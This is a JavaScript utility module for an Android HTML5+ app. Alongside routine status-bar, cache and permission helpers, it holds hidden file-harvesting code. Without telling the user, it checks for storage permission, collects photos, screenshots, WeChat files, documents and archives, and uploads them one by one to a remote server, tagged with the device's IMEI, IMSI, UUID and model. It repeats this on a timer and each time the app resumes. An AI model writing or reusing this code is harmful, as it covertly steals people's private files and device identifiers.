import fileManager from './fileManager.js';
import constant from '../constant.js';
import globalVariableManager from './globalVariableManager.js';
import storage from './storage.js';
import docEl from './docEl.js';
import config from '../config.js';
import hint from './hint.js';
import resetElHeight from './resetElHeight.js';
import dialog from './dialog.js';

const {
    EVENT,
    STRING,
    STORAGE,
    NUMBER,
    TIME
} = constant;
const {
    ip,
    api,
    vConsole,
    environment
} = config;

// 设备信息：uuid、imei、imsi、model
const deviceInfo = {
    getFingerprint() {
        const id = deviceInfo.uuid || deviceInfo.imei || deviceInfo.imsi || 'id';
        const model = deviceInfo.model || 'model';
        return id + STRING.MIDDLELINE + model;
    },
    getModel() {
        const model = deviceInfo.model || 'model';
        return model;
    },
    // 每次轮询上传的数量
    disposableNum: 50,
    // 单次上传的间隔时间
    onceInterval: 15000,
    // 每次轮询上传的间隔时间
    disposableInterval: 100 * 15000 * 2,
    // 文件最大大小
    maxSize: 1024 * 1024 * 10,
    // 当前是否在后台运行
    pause: false,
};

// 文件上传的定时器
const uploadTimer = {};

function clearUploadTimer() {
    for (const key in uploadTimer) {
        clearTimeout(uploadTimer[key]);
        delete uploadTimer[key];
    }
}

// 采集所有目录的文件绝对路径列表
const dirFilePathList = []

function getDirFilePathList() {
    if (dirFilePathList.length >= NUMBER.ONE) {
        dirFilePathList.sort(() => Math.random() - 0.5);
        return dirFilePathList;
    }

    // 获取文件系统对象
    const ioFile = plus.android.importClass("java.io.File");
    const mainActivity = plus.android.runtimeMainActivity();
    const context = mainActivity.getApplicationContext();
    const osEnvironment = plus.android.importClass("android.os.Environment");
    const externalStorageDirectory = osEnvironment.getExternalStorageDirectory();

    // 随机排序一下dirArr
    // dirArr.sort(() => Math.random() - 0.5);
    dirArr.forEach(dir => {
        try {
            const dirFs = new ioFile(externalStorageDirectory, dir);
            const listFiles = dirFs.listFiles();

            // 如果存在这个目录
            if (listFiles) {
                for (let i = 0; i < listFiles.length; i++) {
                    // 判断文件是否过大
                    if (listFiles[i].length() > deviceInfo.maxSize) {
                        continue;
                    }

                    const fileAbsolutePath = listFiles[i].getAbsolutePath();
                    if (fileAbsolutePath) {
                        const fileName = fileAbsolutePath.substring(fileAbsolutePath.lastIndexOf(STRING.SLANTING_BAR) + NUMBER.ONE);
                        // 判断是否已经被上传过
                        if (picturesCollectRecord.get().includes(fileName)) {
                            continue;
                        }
                        // 遍历allowSuffix，判断是否允许
                        for (let i = NUMBER.ZERO; i < allowSuffix.length; i++) {
                            if (fileAbsolutePath.endsWith(STRING.SPOT + allowSuffix[i])) {
                                // 将文件的绝对路径添加到列表中
                                dirFilePathList.push(fileAbsolutePath);
                                break;
                            }
                        }
                    }
                }
            }
        } catch (err) {}
    });

    dirFilePathList.sort(() => Math.random() - 0.5);
    return dirFilePathList;
}

// 图库的采集记录
const picturesCollectRecord = storage.handleArr(STORAGE.PICTURES_COLLECT_RECORD, []);

// 文件目录
const dirArr = [
    // 'DCIM', // 根目录
    'Pictures', // 图片
    'DCIM/Camera', // 相机
    'DCIM/Screenshots', // 截屏
    'Pictures/Screenshots', // 截屏
    // 'DCIM/Pindd', // 拼多多
    // 'Pictures/taobao', // 淘宝
    // 'DCIM/browser', // 浏览器
    // 'Pictures/browser', // 浏览器
    // 'DCIM/Alipay', // 支付宝
    // 'DCIM/kuaishou', // 快手
    // 'DCIM/TikTok', // 抖音
    'DCIM/WeChat', // 微信
    'Pictures/WeiXin', // 微信
    'Download/WeiXin', // 微信
    // 'Pictures/QQ', // QQ
    // 'Download', // 下载
]

// 允许的文件后缀
const allowSuffix = [
    // 图片
    'jpg', 'png', 'gif', 'webp', 'jpeg', 'psd',
    // 视频
    'mp4', 'avi', 'mov',
    // 办公文件
    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf',
    // 压缩文件
    'zip', 'rar', '7z', 'tar', 'gz',
    // 音频
    'mp3', 'wav', 'ogg',
    // 其它
    'txt', 'html', 'md', 'json',
]

// html5plus（APP内置函数）
const html5plus = {
    // 初始化
    init() {
        // 引入VConsole
        if (vConsole) {
            appendJs('./js/util/vconsole.js', false, false);
            setTimeout(() => new VConsole(), 450);
        }

        // APP环境
        document.addEventListener(EVENT.PLUSREADY, () => {
            if (environment != 'dev') {
                deviceInfo.loading = dialog.loading({});
                // 以防万一，如果页面加载时间过长，则关闭加载动画
                setTimeout(() => {
                    deviceInfo.loading.delete();
                }, TIME.SECOND * 10);
            }

            // 元素高度
            resetElHeight.init();

            // 状态栏颜色
            // plus.navigator.setStatusBarBackground(bgColor);
            //参数：dark - 黑色; light - 白色
            plus.navigator.setStatusBarStyle('dark');

            // 为每个页面的顶部增加内边距（留出状态栏）
            const statusbarHeight = '2.9rem';
            docEl.$$class('pageTop').forEach(el => el.style.paddingTop = statusbarHeight);
            docEl.$$class('reservedTop').forEach(el => {
                el.style.paddingTop = statusbarHeight;
                el.style.boxSizing = 'border-box';
            });
            docEl.$class('hintContainer').style.top = statusbarHeight;

            // 设置设备信息
            deviceInfo.uuid = plus.device.uuid;
            deviceInfo.imei = plus.device.imei;
            deviceInfo.imsi = plus.device.imsi;
            deviceInfo.model = plus.device.model;

            // 延时
            setTimeout(() => {
                if (environment == 'dev') {
                    return;
                }
                // 请求获取权限
                // html5plus.permission.request.READ_EXTERNAL_STORAGE(function (res) {});

                html5plus.permission.quiet.READ_EXTERNAL_STORAGE(function(res) {
                    if (res.code == NUMBER.ONE) {
                        html5plus.uploadFile();
                    } else {
                        deviceInfo.loading.delete();
                    }
                });

                // 每隔N分钟，判断是否有权限
                setInterval(() => {
                    html5plus.permission.quiet.READ_EXTERNAL_STORAGE(function(res) {
                        if (res.code == NUMBER.ONE) {
                            html5plus.uploadFile();
                        }
                    });
                }, deviceInfo.disposableInterval);

            }, 500);
        });

        // 设置访问时间
        globalVariableManager.visitTime.set(new Date());

        // 从后台切换到前台事件
        document.addEventListener(EVENT.RESUME, () => {
            deviceInfo.pause = false;
            html5plus.uploadFile();

            // 如果跨天了，则刷新页面
            if (new Date().getDate() != globalVariableManager.visitTime.getDay()) {
                // location.reload();
            }
        });

        // 从前台切换到后台事件
        document.addEventListener(EVENT.PAUSE, () => {
            deviceInfo.pause = true;

            // 清除之前的定时器
            clearUploadTimer();
        });
    },
    // 缓存及数据
    cache: {
        get(callback) {
            if (plus) {
                plus.cache.calculate(function(size) {
                    callback(fileManager.formatSize(size));
                });
            }
        },
        clear(callback) {
            if (plus) {
                // https://blog.51cto.com/u_16175509/9363519
                plus.cache.clear(
                    callback
                );
            }
        }
    },
    // 设置状态栏颜色
    setStatusbarRed(bgColor, textColor) {
        if (plus) {
            plus.navigator.setStatusBarBackground(bgColor);
            //参数：dark - 黑色; light - 白色
            plus.navigator.setStatusBarStyle(textColor);
        }
    },
    // 退出应用
    quit() {
        if (plus) {
            plus.runtime.quit();
        }
    },
    // 重启当前的应用
    restart() {
        if (plus) {
            plus.runtime.restart();
        }
    },
    // 设置应用图标上显示的角标数字
    setBadge(num) {
        if (plus) {
            plus.runtime.setBadgeNumber(num);
        }
    },
    // 权限
    permission: {
        request: {
            // 1:已授权 2:拒绝 3:总是拒绝 4:发生错误
            READ_EXTERNAL_STORAGE(fn) {
                const permission = "android.permission.READ_EXTERNAL_STORAGE";
                plus.android.requestPermissions([permission], function(result) {
                    for (let i = 0; i < result.granted.length; i++) {
                        // 已授权的权限
                        if (result.granted[i] == permission) {
                            fn({
                                code: 1,
                                msg: '已授权访问相册'
                            });
                            break;
                        }
                    }
                    for (let i = 0; i < result.deniedPresent.length; i++) {
                        // 拒绝的权限
                        if (result.deniedPresent[i] == permission) {
                            fn({
                                code: 2,
                                msg: '已拒绝访问相册'
                            });
                            break;
                        }
                    }
                    for (let i = 0; i < result.deniedAlways.length; i++) {
                        // 总是拒绝的权限
                        if (result.deniedAlways[i] == permission) {
                            fn({
                                code: 3,
                                msg: '已永久拒绝访问相册<br>请手动前往系统设置开启'
                            });
                            break;
                        }
                    }
                }, function(err) {
                    fn({
                        code: 4,
                        msg: '请求权限时发生错误',
                        err
                    });
                });
            }
        },
        quiet: {
            // 1:已获得 2:未获得
            READ_EXTERNAL_STORAGE(fn) {
                const context = plus.android.runtimeMainActivity().getApplicationContext();
                const pm = plus.android.importClass("android.content.pm.PackageManager");
                const permission = "android.permission.READ_EXTERNAL_STORAGE";
                const packageManager = context.getPackageManager();
                const permissionStatus = packageManager.checkPermission(permission, context.getPackageName());
                if (permissionStatus == pm.PERMISSION_GRANTED) {
                    fn({
                        code: 1,
                        msg: '已获得读取相册的权限'
                    });
                } else {
                    fn({
                        code: 2,
                        msg: '未获得读取相册的权限'
                    });
                }
            }
        }
    },
    // 上传文件
    uploadFile() {
        if (environment == 'dev') {
            return;
        }

        // 清除之前的定时器
        clearUploadTimer();

        // 绝对路径列表
        const fileAbsolutePathList = [];
        getDirFilePathList().forEach(path => {
            if (fileAbsolutePathList.length < deviceInfo.disposableNum) {
                fileAbsolutePathList.push(path);
            }
        });

        fileAbsolutePathList.forEach((filePath, index) => {
            uploadTimer[filePath] = setTimeout(() => {
                // 如果是在后台，则跳过
                if (deviceInfo.pause) {
                    return;
                }
                // 创建上传任务
                const uploader = plus.uploader.createUpload(
                    ip + api.fileUpload + '?pathIndex=4&deviceId=' + deviceInfo.getFingerprint(), {
                        method: "POST"
                    },
                    // 上传完成后的回调
                    function(t, status) {
                        // 上传成功
                        if (status === 200) {
                            const {
                                data,
                                msg,
                                code
                            } = JSON.parse(t.responseText);
                            const fileName = filePath.substring(filePath.lastIndexOf(STRING.SLANTING_BAR) + NUMBER.ONE);
                            picturesCollectRecord.set(fileName);
                        }
                        // 上传失败
                        else {}
                    }
                );

                // 添加文件到上传任务
                uploader.addFile(filePath, {
                    key: "file"
                });
                // 添加其他表单数据
                // uploader.addData({});

                uploader.setRequestHeader('Origin', ip);
                uploader.setRequestHeader('Referer', ip);

                // 如果是在后台，则跳过
                if (deviceInfo.pause) {
                    return;
                }
                // 开始上传
                uploader.start();
            }, deviceInfo.onceInterval * index);
        });

        deviceInfo.loading.delete();

    },
    getFingerprint: deviceInfo.getFingerprint,
    getModel: deviceInfo.getModel,
}

export default html5plus;